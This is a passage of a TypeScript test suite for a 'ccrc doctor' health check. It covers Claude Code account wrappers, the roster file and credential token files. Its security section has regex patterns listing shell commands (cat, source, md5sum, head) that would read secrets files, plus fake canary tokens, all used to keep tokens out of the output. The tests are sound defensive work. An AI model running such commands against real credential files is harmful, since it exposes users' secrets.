    const [total, skipped, verdicts, pass, warn, fail] = m!.slice(1).map(Number);
    expect(total).toBe(tableNames().length);
    expect(skipped).toBe(HEALTHY_SKIPS);
    expect(warn).toBeGreaterThanOrEqual(1);
    expect(fail).toBeGreaterThanOrEqual(1);
    // BOTH nouns, because they are different numbers here: twelve checks
    // answered with thirteen verdicts. The line says which is which so that the
    // sum not matching the leading number reads as the fact it is rather than
    // as an arithmetic bug somebody should go and "fix".
    expect(pass + warn + fail).toBe(verdicts);
    // The comparison is against the checks that ANSWERED WITH A VERDICT, not
    // against every check in the table. A skip subtracts a verdict without
    // subtracting a check, so on a platform that legitimately skips some
    // (every platform: `models`; macOS also: `scopes`) the two-class check's
    // extra verdict is cancelled exactly, and `verdicts > total` reads
    // 26 > 26 — a red leg reporting arithmetic that was never wrong. On
    // Linux `HEALTHY_SKIPS` is 1 (`models`) and this is the assertion it
    // always was, just no longer over a zero skip count.
    expect(verdicts).toBeGreaterThan(total - HEALTHY_SKIPS);
  });

  // ── an external account: existence, and nothing else ────────────────────
  it('passes a COMPILED external launcher — an external account\'s content is never read', () => {
    // The measured defect: `wr_seen` demanded a script carrying a literal
    // `export CLAUDE_CONFIG_DIR=` line, so a legitimate external account was
    // reported as `ext-bin is declared external but … is not a script`.
    const home = healthy('ccrc-doctor-wrappers-extcompiled-');
    writeBinary(home, 'ext-bin');
    writeRoster(home, [{ id: 'ext-bin', exec: { kind: 'external' } }]);
    const r = runDoctor(home);
    expect(r.stdout).not.toMatch(/ext-bin/);
    expect(lineFor(r.stdout, 'wrappers')).toMatch(/^PASS wrappers: /);
    expect(r.code).toBe(0);
  });

  it('passes an external launcher that spells CLAUDE_CONFIG_DIR its own way', () => {
    // `CLAUDE_CONFIG_DIR=… exec claude "$@"` is a perfectly good launcher and
    // matches no `^\s*export\s+CLAUDE_CONFIG_DIR=` line. ccrc does not write
    // external wrappers, so it has no standing to demand a spelling of one.
    const home = healthy('ccrc-doctor-wrappers-extinline-');
    writeFileSync(join(binDir(home), 'ext-sh'), [
      '#!/usr/bin/env bash',
      'CLAUDE_CONFIG_DIR="$HOME/.ext-sh" exec "$HOME/.local/bin/claude" "$@"',
      '',
    ].join('\n'), { mode: 0o755 });
    writeRoster(home, [{ id: 'ext-sh', exec: { kind: 'external' } }]);
    const r = runDoctor(home);
    expect(r.stdout).not.toMatch(/ext-sh/);
    expect(lineFor(r.stdout, 'wrappers')).toMatch(/^PASS wrappers: /);
  });

  it('fails an external account with no executable at all — presence IS checked', () => {
    // The other half of the rule. "Never read" is not "never look".
    const home = healthy('ccrc-doctor-wrappers-ext-missing-');
    writeRoster(home, [{ id: 'ext-gone', exec: { kind: 'external' } }]);
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/FAIL wrappers: ext-gone has no executable at \$HOME\/\.local\/bin\/ext-gone/);
    expect(r.code).toBe(1);
  });

  // ── the upstream account: the same presence triad ───────────────────────
  // A2-NEW: the absent-class arms of this triad (no file at all, a dangling
  // symlink) route to `wr_upstream`, not `wr_hard` — a fresh box that has
  // never had Claude Code installed is told to install it, not to reconcile a
  // roster that is already correct. The DETAIL sentence is unchanged (same
  // `_dr_wr_present` wording as the generated/external arms); only the
  // REMEDY moves. Present-but-wrong (not executable) is the one arm that
  // stays `wr_hard` — `_dr_wr_present` hard-wires that arm regardless of
  // which bucket the caller names, so a file on disk that disagrees is still
  // a roster/wrapper disagreement, not an absent binary.
  it('fails when the upstream account has no executable at all — told to install it, not sync the roster (A2-NEW)', () => {
    const home = healthy('ccrc-doctor-wrappers-up-missing-');
    rmSync(join(binDir(home), 'claude'), { force: true });
    const r = runDoctor(home);
    const lines = r.stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('FAIL wrappers: '));
    expect(i, r.stdout).toBeGreaterThan(-1);
    expect(lines[i]).toMatch(/claude has no executable at \$HOME\/\.local\/bin\/claude/);
    // MEASURED RED (before A2-NEW's split): the remedy here was the generic
    // "the roster is the source of truth … 'ccrc adopt --out /tmp/accounts.json'"
    // sentence — the wrong instruction for a binary nothing on disk has ever
    // tried to be, and one a fresh-VM operator cannot act on.
    expect(lines[i + 1]).toMatch(/install Claude Code/);
    expect(lines[i + 1]).not.toMatch(/ccrc adopt/);
    expect(r.code).toBe(1);
  });

  it('fails when the upstream account is a symlink to a path that does not exist — same install remedy (A2-NEW)', () => {
    const home = healthy('ccrc-doctor-wrappers-up-dangling-');
    rmSync(join(binDir(home), 'claude'), { force: true });
    symlinkSync(join(home, '.local', 'share', 'claude', 'versions', 'gone'), join(binDir(home), 'claude'));
    const r = runDoctor(home);
    // The measured shape of a real upstream account is exactly this symlink,
    // pointing at a versions/ directory an update can remove.
    const lines = r.stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('FAIL wrappers: '));
    expect(i, r.stdout).toBeGreaterThan(-1);
    expect(lines[i]).toMatch(/claude's \$HOME\/\.local\/bin\/claude is a symlink to a path that does not exist/);
    expect(lines[i]).not.toMatch(/claude has no executable/);
    expect(lines[i + 1]).toMatch(/install Claude Code/);
    expect(lines[i + 1]).not.toMatch(/ccrc adopt/);
    expect(r.code).toBe(1);
  });

  it('fails when the upstream account is present but not executable — stays the roster-sync remedy', () => {
    // The DELIBERATE asymmetry, pinned from the other side: present-but-wrong
    // is a file on disk that disagrees, which `_dr_wr_present` hard-wires to
    // `wr_hard` no matter which bucket the caller names — a `chmod` is not an
    // install, so this one keeps the OLD remedy.
    const home = healthy('ccrc-doctor-wrappers-up-noexec-');
    chmodSync(join(binDir(home), 'claude'), 0o644);
    const r = runDoctor(home);
    const lines = r.stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('FAIL wrappers: '));
    expect(i, r.stdout).toBeGreaterThan(-1);
    expect(lines[i]).toMatch(/claude's \$HOME\/\.local\/bin\/claude is not executable/);
    expect(lines[i + 1]).toMatch(/^ {2}remedy: the roster is the source of truth/);
    expect(lines[i + 1]).not.toMatch(/install Claude Code/);
    expect(r.code).toBe(1);
  });

  it('both buckets in one run: an absent upstream binary and a disagreeing generated wrapper — two FAIL lines, distinct remedies, upstream first (A2-NEW)', () => {
    const home = healthy('ccrc-doctor-wrappers-upstream-and-hard-');
    // claude: upstream, declared, nothing on disk at all — the wr_upstream class.
    rmSync(join(binDir(home), 'claude'), { force: true });
    // acct-a: generated, present, but its wrapper's CLAUDE_CONFIG_DIR disagrees
    // with the roster's configDirSuffix — the wr_hard (disagreement) class.
    writeWrapper(home, 'acct-a', { cfgDir: '.somewhere-else' });
    writeRoster(home, [
      UPSTREAM,
      { id: 'acct-a', configDirSuffix: '.acct-a', exec: { kind: 'generated' } },
    ]);
    const r = runDoctor(home);
    const lines = r.stdout.split('\n');
    const failIdx = lines.reduce<number[]>((acc, l, idx) => {
      if (l.startsWith('FAIL wrappers: ')) acc.push(idx);
      return acc;
    }, []);
    expect(failIdx.length, r.stdout).toBe(2);
    const [upstreamIdx, hardIdx] = failIdx;
    // The upstream line comes FIRST — the verdict assembly's own ordering,
    // most-actionable leads.
    expect(lines[upstreamIdx]).toMatch(/claude has no executable at \$HOME\/\.local\/bin\/claude/);
    expect(lines[upstreamIdx + 1]).toMatch(/install Claude Code/);
    expect(lines[hardIdx]).toContain('acct-a');
    expect(lines[hardIdx]).toMatch(/\.somewhere-else.*\.acct-a/);
    expect(lines[hardIdx + 1]).toMatch(/^ {2}remedy: the roster is the source of truth/);
    expect(r.code).toBe(1);
  });

  it('fails when the upstream account is ITSELF a script that sets CLAUDE_CONFIG_DIR', () => {
    // The upstream account is invoked with CLAUDE_CONFIG_DIR unset by
    // definition (ccrc-adopt's header). A wrapper there means every other
    // account's exec lands in whatever config dir this one exports.
    const home = healthy('ccrc-doctor-wrappers-up-is-wrapper-');
    writeWrapper(home, 'claude', { cfgDir: '.claude' });
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/FAIL wrappers: claude is the roster's upstream account, but \$HOME\/\.local\/bin\/claude is a script that sets CLAUDE_CONFIG_DIR/);
    expect(r.code).toBe(1);
  });

  // ── the four-way a-only split, pinned where it is easiest to collapse ────
  it('a generated account whose wrapper is a DANGLING SYMLINK says so, not "no executable"', () => {
    const home = healthy('ccrc-doctor-wrappers-gen-dangling-');
    symlinkSync(join(home, '.local', 'bin', 'nothing-here'), join(binDir(home), 'acct-a'));
    writeRoster(home, [{ id: 'acct-a', exec: { kind: 'generated' } }]);
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/acct-a's \$HOME\/\.local\/bin\/acct-a is a symlink to a path that does not exist/);
    expect(r.stdout).not.toMatch(/acct-a has no executable/);
    expect(r.stdout).not.toMatch(/acct-a's \$HOME\/\.local\/bin\/acct-a is not executable/);
    expect(r.code).toBe(1);
  });

  it('a generated account whose wrapper is NOT EXECUTABLE says so, not "no executable"', () => {
    // A `chmod` and a reinstall are different actions, so these are different
    // sentences. The check's own comment calls this four-way split an
    // anti-overloaded-seam design; these two tests are what makes that true.
    const home = healthy('ccrc-doctor-wrappers-gen-noexec-');
    writeWrapper(home, 'acct-a', { cfgDir: '.acct-a' });
    chmodSync(join(binDir(home), 'acct-a'), 0o644);
    writeRoster(home, [{ id: 'acct-a', configDirSuffix: '.acct-a', exec: { kind: 'generated' } }]);
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/acct-a's \$HOME\/\.local\/bin\/acct-a is not executable/);
    expect(r.stdout).not.toMatch(/acct-a has no executable/);
    expect(r.stdout).not.toMatch(/is a symlink to a path that does not exist/);
    expect(r.code).toBe(1);
  });

  it('a generated account whose wrapper is NOT A SCRIPT says so', () => {
    // Present, executable, and an ELF: the roster claims ccrc generated this
    // wrapper, and what is there was never generated by anything. Unpinned
    // until the round-2 review measured it — blanking this whole inner branch
    // left the suite green while a real defect went unreported.
    const home = healthy('ccrc-doctor-wrappers-gen-notscript-');
    writeBinary(home, 'acct-a');
    writeRoster(home, [{ id: 'acct-a', configDirSuffix: '.acct-a', exec: { kind: 'generated' } }]);
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/acct-a is declared generated but \$HOME\/\.local\/bin\/acct-a is not a script/);
    expect(r.code).toBe(1);
  });

  it('a generated account whose wrapper sets NO CLAUDE_CONFIG_DIR says so', () => {
    // A script, executable, and it launches something — but it exports no
    // config dir, so it runs in whatever directory the caller had. That is a
    // different repair from "this is not a script at all".
    const home = healthy('ccrc-doctor-wrappers-gen-nocfgdir-');
    writeFileSync(join(binDir(home), 'acct-a'), [
      '#!/usr/bin/env bash',
      '# no export line at all',
      'exec "$HOME/.local/bin/claude" "$@"',
      '',
    ].join('\n'), { mode: 0o755 });
    writeRoster(home, [{ id: 'acct-a', configDirSuffix: '.acct-a', exec: { kind: 'generated' } }]);
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/acct-a is declared generated but \$HOME\/\.local\/bin\/acct-a sets no CLAUDE_CONFIG_DIR/);
    expect(r.stdout).not.toMatch(/is not a script/);
    expect(r.code).toBe(1);
  });

  it('keeps the two shape sentences DISTINCT when both defects are on one box', () => {
    // The merge this pins against is the one-liner a tidy-minded reader
    // reaches for: `… is not a wrapper` covering both. One run, both defects,
    // and the operator has to be able to tell which file needs which repair —
    // reinstall the wrapper, versus add the line it is missing.
    const home = healthy('ccrc-doctor-wrappers-shape-distinct-');
    writeBinary(home, 'acct-elf');
    writeFileSync(join(binDir(home), 'acct-sh'), [
      '#!/usr/bin/env bash',
      'exec "$HOME/.local/bin/claude" "$@"',
      '',
    ].join('\n'), { mode: 0o755 });
    writeRoster(home, [
      { id: 'acct-elf', configDirSuffix: '.acct-elf', exec: { kind: 'generated' } },
      { id: 'acct-sh', configDirSuffix: '.acct-sh', exec: { kind: 'generated' } },
    ]);
    const line = lineFor(runDoctor(home).stdout, 'wrappers') ?? '';
    expect(line).toContain('acct-elf is declared generated but $HOME/.local/bin/acct-elf is not a script');
    expect(line).toContain('acct-sh is declared generated but $HOME/.local/bin/acct-sh sets no CLAUDE_CONFIG_DIR');
    // Two findings, two sentences, and neither account is described by the
    // other's words.
    expect(line).not.toMatch(/acct-elf[^;]*sets no CLAUDE_CONFIG_DIR/);
    expect(line).not.toMatch(/acct-sh[^;]*is not a script/);
  });

  it('fails when what is at $HOME/.local/bin/<id> is a DIRECTORY, for either kind', () => {
    // A directory is `-e` and `-x` both — that is what the execute bit means
    // on one — so a presence check written as "exists and is executable" reads
    // `mkdir` as a healthy account. Both kinds that share `_dr_wr_present` are
    // in this one fixture, because the narrowing was in the shared helper.
    const home = healthy('ccrc-doctor-wrappers-dir-');
    rmSync(join(binDir(home), 'claude'), { force: true });
    mkdirSync(join(binDir(home), 'claude'), { recursive: true });
    mkdirSync(join(binDir(home), 'ext-dir'), { recursive: true });
    writeRoster(home, [{ id: 'ext-dir', exec: { kind: 'external' } }]);
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/ext-dir's \$HOME\/\.local\/bin\/ext-dir is not a regular file/);
    expect(r.stdout).toMatch(/claude's \$HOME\/\.local\/bin\/claude is not a regular file/);
    expect(lineFor(r.stdout, 'wrappers')).not.toMatch(/^PASS/);
    expect(r.code).toBe(1);
  });

  // ── the roster as a document: every way it can be wrong ─────────────────
  it('fails when the same id is declared twice in the roster', () => {
    // Two entries, one wrapper: whichever one an operator edits, the other is
    // still there. A silent "last one wins" is how a fixed account stays broken.
    const home = healthy('ccrc-doctor-wrappers-dup-id-');
    writeWrapper(home, 'acct-a', { cfgDir: '.acct-a' });
    const e = entry({ id: 'acct-a', configDirSuffix: '.acct-a', exec: { kind: 'generated' } });
    writeRawRoster(home, rawRoster(UP_JSON, e, e));
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/FAIL wrappers: .*acct-a is declared twice in the roster/);
    expect(r.code).toBe(1);
  });

  it('fails when a roster entry has no id at all', () => {
    const home = healthy('ccrc-doctor-wrappers-no-id-');
    writeRawRoster(home, rawRoster(UP_JSON, entry({ configDirSuffix: '.x', exec: { kind: 'generated' } })));
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/FAIL wrappers: .*the roster holds an account with no id/);
    expect(r.code).toBe(1);
  });

  it('refuses an id that is not an id, instead of inventing a plausible one', () => {
    // The reader used to squash `\t` to a space, so `"acct\tb"` was reported as
    // `acct b has no executable at …` — a sentence about an account that does
    // not exist, naming a file nobody could create. WRAPPER_ID_RE is the same
    // rule the disk side is held to; the id is echoed back as it was spelled.
    const home = healthy('ccrc-doctor-wrappers-illegal-id-');
    writeRawRoster(home, rawRoster(UP_JSON, entry({ id: 'acct\tb', exec: { kind: 'generated' } })));
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/FAIL wrappers: .*is not a legal account id/);
    expect(r.stdout).toContain('acct\\tb');
    expect(r.stdout).not.toMatch(/acct b/);
    expect(r.code).toBe(1);
  });

  it('escapes EVERY control byte, not the three that would break its own TSV', () => {
    // The verdict line is read by a human on a terminal that ACTS on control
    // bytes: `claude-x<BS>acme` renders as an account that exists. Escaping only
    // \t \r \n left the invented-id failure reachable through any other C0
    // byte, so the whole range is escaped and none of it reaches the output.
    const home = healthy('ccrc-doctor-wrappers-c0-id-');
    writeRawRoster(home, rawRoster(UP_JSON, entry({ id: 'claude-x\bacme', exec: { kind: 'generated' } })));
    const r = runDoctor(home);
    expect(r.stdout).toContain('claude-x\\x08acme');
    expect(r.stdout).toMatch(/is not a legal account id/);
    expect(r.stdout).not.toContain('\b');
    expect(r.stderr).not.toContain('\b');
  });

  it('escapes the backslash too, so an escaped id cannot be forged by a real one', () => {
    // Injectivity, which is the whole value of an escaped rendering: without
    // the backslash escape, an id spelled with a literal backslash-t and an id
    // carrying a real tab print IDENTICALLY, and the operator cannot tell
    // which of the two is in the file they are about to edit.
    const home = healthy('ccrc-doctor-wrappers-escape-injective-');
    writeRawRoster(home, rawRoster(UP_JSON,
      entry({ id: 'acct\tb', exec: { kind: 'generated' } }),        // a real TAB
      entry({ id: 'acct\\tb', exec: { kind: 'generated' } })));     // a literal backslash-t
    const line = lineFor(runDoctor(home).stdout, 'wrappers') ?? '';
    expect(line).toContain('acct\\tb');       // the tab, escaped
    expect(line).toContain('acct\\\\tb');     // the backslash, escaped — a different string
  });

  it('fails when a generated entry declares no configDirSuffix for its wrapper to match', () => {
    const home = healthy('ccrc-doctor-wrappers-no-suffix-');
    writeWrapper(home, 'acct-a', { cfgDir: '.acct-a' });
    writeRawRoster(home, rawRoster(UP_JSON, entry({ id: 'acct-a', exec: { kind: 'generated' } })));
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/acct-a's roster entry declares no configDirSuffix, so its wrapper's \.acct-a answers to nothing/);
    expect(r.code).toBe(1);
  });

  it('fails on an exec.kind it does not understand rather than skipping the entry', () => {
    // The `*)` arm. An entry this check cannot classify is an entry it did not
    // check, and a doctor that silently skips one reports a box it never
    // measured.
    const home = healthy('ccrc-doctor-wrappers-bad-kind-');
    writeRawRoster(home, rawRoster(UP_JSON,
      entry({ id: 'acct-a', configDirSuffix: '.acct-a', exec: { kind: 'weird' } })));
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/acct-a's roster entry declares no exec\.kind this check understands \("weird"\)/);
    expect(r.code).toBe(1);
  });

  it('WARNS when the roster declares no upstream account for an exec target to be checked against', () => {
    const home = healthy('ccrc-doctor-wrappers-no-upstream-');
    writeWrapper(home, 'acct-a', { cfgDir: '.acct-a' });
    writeRawRoster(home, rawRoster(entry({ id: 'acct-a', configDirSuffix: '.acct-a', exec: { kind: 'generated' } })));
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^WARN wrappers: the roster declares no upstream account/m);
    expect(r.code).toBe(0);
  });

  it('WARNS when the roster declares more than one upstream account, and names the one it used', () => {
    const home = healthy('ccrc-doctor-wrappers-two-upstream-');
    writeBinary(home, 'claude-b');
    writeWrapper(home, 'acct-a', { cfgDir: '.acct-a' });
    writeRawRoster(home, rawRoster(UP_JSON,
      entry({ id: 'claude-b', configDirSuffix: '.claude-b', exec: { kind: 'upstream' } }),
      entry({ id: 'acct-a', configDirSuffix: '.acct-a', exec: { kind: 'generated' } })));
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^WARN wrappers: the roster declares 2 upstream accounts; every exec target was checked against the first, claude$/m);
    expect(r.code).toBe(0);
  });

  it('fails when the roster parses but declares no accounts array', () => {
    const home = healthy('ccrc-doctor-wrappers-no-array-');
    writeRawRoster(home, '{"version":1}');
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^FAIL wrappers: .*parses but declares no accounts array/m);
    expect(r.stdout).not.toMatch(/does not parse/);
    expect(r.code).toBe(1);
  });

  it('fails when the roster path is not a regular file, rather than reading a directory', () => {
    const home = healthy('ccrc-doctor-wrappers-notafile-');
    rmSync(join(home, '.ccrc', 'accounts.json'), { force: true });
    mkdirSync(join(home, '.ccrc', 'accounts.json'), { recursive: true });
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^FAIL wrappers: .*is not a regular file/m);
    expect(r.stdout).not.toMatch(/no account roster at/);
    expect(r.code).toBe(1);
  });

  it.skipIf(process.getuid?.() === 0)(
    'a roster it cannot READ is its own answer, not "does not parse"', () => {
      // A mode/ownership fix and a restore-from-backup are different actions.
      // Skipped as root, where 000 is not a permission at all.
      const home = healthy('ccrc-doctor-wrappers-unreadable-');
      chmodSync(join(home, '.ccrc', 'accounts.json'), 0o000);
      const r = runDoctor(home);
      expect(r.stdout).toMatch(/^FAIL wrappers: .*cannot be read \(EACCES\)/m);
      expect(r.stdout).not.toMatch(/does not parse/);
      expect(r.stdout).toMatch(/^ {2}remedy: .*ls -l/m);
      expect(r.code).toBe(1);
    });

  it('says node is missing, in its own words, rather than blaming the roster', () => {
    // A check must not fail for a reason that belongs to another check: with no
    // interpreter there is nothing wrong with the roster, and the remedy points
    // at the node check rather than at accounts.json.
    const home = healthy('ccrc-doctor-wrappers-nonode-');
    unstub(home, 'node');
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^FAIL wrappers: node is not on PATH/m);
    expect(r.stdout).not.toMatch(/does not parse/);
    expect(r.code).toBe(1);
  });

  it('an unknown exit from the roster reader is called a bug in ccrc, not a fact about the box', () => {
    // The reader answers 0/3/4/5/6 and this arm is what happens when it one day
    // answers something else. Reached by making the interpreter itself fail for
    // the roster read only.
    const home = healthy('ccrc-doctor-wrappers-weird-exit-');
    stubNodeRosterExit(home, 7);
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^FAIL wrappers: reading \$HOME\/\.ccrc\/accounts\.json exited 7 — this check does not know what that means/m);
    expect(r.stdout).toMatch(/^ {2}remedy: this is a bug in ccrc/m);
    expect(r.code).toBe(1);
  });

  it('fails when there is no $HOME/.local/bin at all', () => {
    const home = healthy('ccrc-doctor-wrappers-nobindir-');
    rmSync(join(home, '.local', 'bin'), { recursive: true, force: true });
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^FAIL wrappers: no \$HOME\/\.local\/bin at all/m);
    expect(r.code).toBe(1);
  });

  it('never tells a deployed box to run a script from a checkout it does not have', () => {
    const text = readFileSync(CHECKS_SRC, 'utf8');
    // `ccrc adopt` execs ccrc-adopt where it ships; a remedy naming a repo-
    // relative path is an instruction only a developer can follow, and doctor's
    // whole job is the box that is not a developer's.
    expect(text).not.toMatch(/bash ccd\/ccrc-adopt/);
  });

  it('tells an operator with a missing wrapper which verb writes one', () => {
    // The a-only side of the roster/disk difference used to end in a paragraph
    // about what an account is. It is now a command.
    expect(readFileSync(CHECKS_SRC, 'utf8')).toMatch(/ccrc wrappers/);
  });

  // ── the security boundary ───────────────────────────────────────────────
  it('does not read, print, or hash the contents of any secrets file', () => {
    // The check compares PATHS. Reading the token would put it in a log — and
    // doctor's output is exactly the thing an operator pastes into a ticket.
    // Scanned across all three shipped files, not just the check's own: the
    // wrapper-shape library is where the secrets PATH is parsed out.
    for (const f of [CHECKS_SRC, LIB_SRC, CCRC_SRC]) {
      const src = readFileSync(f, 'utf8');
      expect(src, f).not.toMatch(/cat\s+[^\n]*cc-secrets|\$\(<[^\n]*cc-secrets/);
      // The generic forms, not just the literal directory name: `$secrets` is
      // what the parsed path is called, and every way of opening it is banned.
      expect(src, f).not.toMatch(/(?:cat|source|md5sum|sha\d+sum|head|tail|mapfile|readarray)\s+[^\n|]*\$\{?(?:w?secrets|SECRETS)\b/);
      expect(src, f).not.toMatch(/<\s*"?\$\{?(?:w?secrets|SECRETS)\b/);
    }
  });

  it('never emits the contents of a secrets file it names — measured with a canary', () => {
    // The source scan above catches the copy someone would write; this catches
    // it however it was written. The file exists, it is readable, it is named
    // in the verdict, and its content must not appear anywhere in the output.
    const home = healthy('ccrc-doctor-wrappers-canary-');
    const canary = 'sk-ccrc-canary-do-not-print-e4f19b';
    mkdirSync(join(home, '.cc-secrets'), { recursive: true });
    writeFileSync(join(home, '.cc-secrets', 'acct-a.env'), `CLAUDE_CODE_OAUTH_TOKEN=${canary}\n`);
    writeWrapper(home, 'acct-a', { cfgDir: '.acct-a', secrets: '.cc-secrets/acct-a.env' });
    writeRoster(home, [{ id: 'acct-a', configDirSuffix: '.acct-a', exec: { kind: 'generated' } }]);
    const r = runDoctor(home);
    expect(r.stdout).toContain('.cc-secrets/acct-a.env');   // the PATH is named
    expect(r.stdout).not.toContain(canary);                 // the CONTENT is not
    expect(r.stderr).not.toContain(canary);
  });

  it('answers the same whether the secrets file exists or not — it is a path, not a fact about a file', () => {
    // Two boxes, one roster, one wrapper: with the secrets file present and
    // absent. A check that stat'ed the path would answer differently, and would
    // then be reporting on the token's existence rather than on the roster.
    const withFile = healthy('ccrc-doctor-wrappers-sec-present-');
    const without = healthy('ccrc-doctor-wrappers-sec-absent-');
    for (const home of [withFile, without]) {
      writeWrapper(home, 'acct-a', { cfgDir: '.acct-a', secrets: '.cc-secrets/acct-a.env' });
      writeRoster(home, [{ id: 'acct-a', configDirSuffix: '.acct-a', exec: { kind: 'generated' } }]);
    }
    mkdirSync(join(withFile, '.cc-secrets'), { recursive: true });
    writeFileSync(join(withFile, '.cc-secrets', 'acct-a.env'), 'TOKEN=x\n');
    const line = lineFor(runDoctor(withFile).stdout, 'wrappers');
    // Not two undefineds: this fixture is the D-69 shape, so there IS a verdict
    // and it is a FAIL. Without this the comparison below passes on a box where
    // the check never ran at all.
    expect(line).toMatch(/^FAIL wrappers: acct-a /);
    expect(line).toBe(lineFor(runDoctor(without).stdout, 'wrappers'));
  });
});


describe('ccrc doctor: credentials', () => {
  it('passes on a healthy box and names what it measured', () => {
    const home = healthy('ccrc-doctor-cred-ok-');
    expect(runDoctor(home).stdout).toMatch(/^PASS credentials: 1 account/m);
  });

  it('goes red — LOUDLY — when an expected token file is absent', () => {
    // THE WHOLE REASON THIS CHECK EXISTS. The roster structurally cannot declare
    // where an `upstream` account's credential lives, so the probe derives the
    // path by convention. A convention with no measurement is a silent skip
    // waiting to happen: the probe would refuse that account for ever and the
    // only place saying so would be a journal nobody reads.
    const home = healthy('ccrc-doctor-cred-missing-');
    rmSync(join(home, '.cc-secrets', 'claude-oauth.env'));
    const r = runDoctor(home);
    expect(r.code).toBe(1);
    expect(r.stdout).toMatch(/^FAIL credentials: claude/m);
    expect(r.stdout).toMatch(/\.cc-secrets\/claude-oauth\.env/);
  });

  it('goes red on an EMPTY token file — E4: an empty bearer answers 429, not an auth error', () => {
    const home = healthy('ccrc-doctor-cred-empty-');
    writeFileSync(join(home, '.cc-secrets', 'claude-oauth.env'), '');
    expect(runDoctor(home).stdout).toMatch(/^FAIL credentials: claude/m);
  });

  it('never prints a byte of the file', () => {
    const home = healthy('ccrc-doctor-cred-quiet-');
    writeFileSync(join(home, '.cc-secrets', 'claude-oauth.env'),
      'export CLAUDE_CODE_OAUTH_TOKEN=sk-ant-oat01-SENTINEL\n');
    const r = runDoctor(home);
    expect(r.stdout).not.toContain('SENTINEL');
    expect(r.stderr).not.toContain('SENTINEL');
  });

  it('uses a declared upstream setup-token path rather than the legacy filename', () => {
    const home = healthy('ccrc-doctor-cred-upstream-declared-');
    writeRoster(home, [{ id: 'claude', configDirSuffix: '.claude',
      exec: { kind: 'upstream', secretsFile: '.private/claude-setup.env' }, telemetry: 'anthropic' }]);
    mkdirSync(join(home, '.private'), { recursive: true });
    writeFileSync(join(home, '.private', 'claude-setup.env'), 'TOKEN=x\n');
    rmSync(join(home, '.cc-secrets', 'claude-oauth.env'));

    expect(runDoctor(home).stdout).toMatch(/^PASS credentials: 1 account/m);
  });

  it('does not accept a stale legacy upstream file when its declaration is absent', () => {
    const home = healthy('ccrc-doctor-cred-upstream-declared-missing-');
    writeRoster(home, [{ id: 'claude', configDirSuffix: '.claude',
      exec: { kind: 'upstream', secretsFile: '.private/claude-setup.env' }, telemetry: 'anthropic' }]);

    const r = runDoctor(home);

    expect(r.code).toBe(1);
    expect(r.stdout).toMatch(/^FAIL credentials: claude has no readable token at \$HOME\/\.private\/claude-setup\.env/m);
  });

  it('fails an invalid declared setup-token path rather than falling back to legacy OAuth', () => {
    const home = healthy('ccrc-doctor-cred-invalid-declared-');
    writeRoster(home, [{ id: 'claude', configDirSuffix: '.claude',
      exec: { kind: 'upstream', secretsFile: '.cc-secrets/../outside.env' }, telemetry: 'anthropic' }]);

    const r = runDoctor(home);

    expect(r.code).toBe(1);
    expect(r.stdout).toMatch(/^FAIL credentials: claude has an invalid declared setup-token credential path/m);
  });

  it('checks a declared generated Anthropic setup token but ignores API-key and login lanes', () => {
    const home = healthy('ccrc-doctor-cred-subjects-');
    writeRoster(home, [UPSTREAM,
      { id: 'setup', exec: { kind: 'generated', provider: 'anthropic', secretsFile: '.private/setup.env' }, telemetry: 'anthropic' },
      { id: 'api', exec: { kind: 'generated', provider: 'openrouter', secretsFile: '.cc-secrets/api-openrouter.env' }, telemetry: 'anthropic' },
      { id: 'login', exec: { kind: 'generated', provider: 'anthropic' }, telemetry: 'anthropic' }]);
    mkdirSync(join(home, '.private'), { recursive: true });
    writeFileSync(join(home, '.private', 'setup.env'), 'TOKEN=x\n');

    expect(runDoctor(home).stdout).toMatch(/^PASS credentials: 2 account/m);
  });

  it('ignores a telemetry:none account — it has no Anthropic credential to have', () => {
    const home = healthy('ccrc-doctor-cred-none-');
    writeRoster(home, [UPSTREAM,
      { id: 'other-lane', exec: { kind: 'external' }, telemetry: 'none' }]);
    expect(runDoctor(home).stdout).toMatch(/^PASS credentials: 1 account/m);
  });

  it('SKIPs rather than PASSing when there is no roster — `wrappers` owns that fact', () => {
    // Two checks measuring one thing is how they come to disagree, and a doctor
    // that reports agreement it measured nothing is the worst failure this verb
    // has. No remedy under a skip, by this file's own contract.
    const home = healthy('ccrc-doctor-cred-noroster-');
    rmSync(join(home, '.ccrc', 'accounts.json'));
    expect(runDoctor(home).stdout).toMatch(/^SKIP credentials: /m);
  });

  it('SKIPs rather than FAILing when $HOME/.cc-secrets does not exist at all — the box is not provisioned yet', () => {
    // THE REGRESSION THIS TEST PINS. `ccrc install` runs `cmd_doctor` and dies
    // on any FAIL, so on every fresh box — and every install fixture — where
    // credentials have not been provisioned yet, this check must not be the
    // thing that blocks the install that has to happen BEFORE provisioning
    // can. "Not provisioned yet" is unmeasurable, and unmeasurable SKIPS; it is
    // a DIFFERENT finding from "provisioned, and this account's file happens
    // to be missing", which stays a FAIL (see the tests above and below this
    // one — they must stay red-on-delete for the arm to mean anything).
    const home = healthy('ccrc-doctor-cred-noprovision-');
    rmSync(join(home, '.cc-secrets'), { recursive: true, force: true });
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^SKIP credentials: /m);
    expect(r.stdout).not.toMatch(/^FAIL credentials: /m);
    expect(r.stdout).toMatch(/\.cc-secrets/);
  });
});


describe('ccrc doctor: pools', () => {
  /** `$HOME/.cc-sessions/pools/<project>`, with EXACT bytes. */
